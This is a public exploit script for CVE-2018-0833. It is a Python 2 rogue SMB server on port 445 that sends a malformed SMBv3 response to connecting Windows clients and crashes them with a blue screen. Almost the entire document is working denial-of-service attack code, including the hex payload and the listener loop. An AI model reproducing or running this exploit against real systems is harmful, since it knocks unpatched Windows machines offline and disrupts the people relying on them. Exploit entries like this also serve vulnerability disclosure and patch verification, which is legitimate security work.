# Exploit Title: Microsoft Windows SMB Client Null Pointer Dereference Denial of Service
# Date: 26/02/2018
# Exploit Author: Nabeel Ahmed
# Version: SMBv3
# Tested on: Windows 8.1 (x86), Windows Server 2012 R2 (x64)
# CVE : CVE-2018-0833

import SocketServer
from binascii import unhexlify
payload = '000000ecfd534d4241414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141'
class byebye(SocketServer.BaseRequestHandler):
        def handle(self):
                try:
                        print "From:", self.client_address
                        print "[*]Sending Payload..."
                        self.request.send(unhexlify(payload))
                except Exception:
                        print "BSoD Triggered on", self.client_address
                        pass
SocketServer.TCPServer.allow_reuse_address = 1
launch = SocketServer.TCPServer(('', 445),byebye)
launch.serve_forever()